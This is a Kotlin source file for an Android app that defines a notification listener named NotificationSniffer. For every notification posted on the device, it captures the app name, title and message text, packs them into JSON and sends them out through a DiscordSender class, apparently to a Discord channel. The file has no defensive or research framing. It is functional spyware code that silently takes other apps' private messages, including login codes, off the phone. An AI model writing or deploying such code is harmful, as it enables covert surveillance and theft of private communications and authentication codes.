package com.sextexer.sex

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotificationSniffer : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        try {
            val pkg = sbn?.packageName ?: return
            val notif = sbn?.notification ?: return
            
            // Get text from the notification
            val content = notif.extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""
            val title = notif.extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
            
            if (content.isNotEmpty() || title.isNotEmpty()) {
                val payload = JSONObject().apply {
                    put("type", "notification")
                    put("package", pkg)
                    put("title", title)
                    put("content", content)
                    put("timestamp", System.currentTimeMillis())
                }
                
                DiscordSender.sendPayload(payload.toString())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
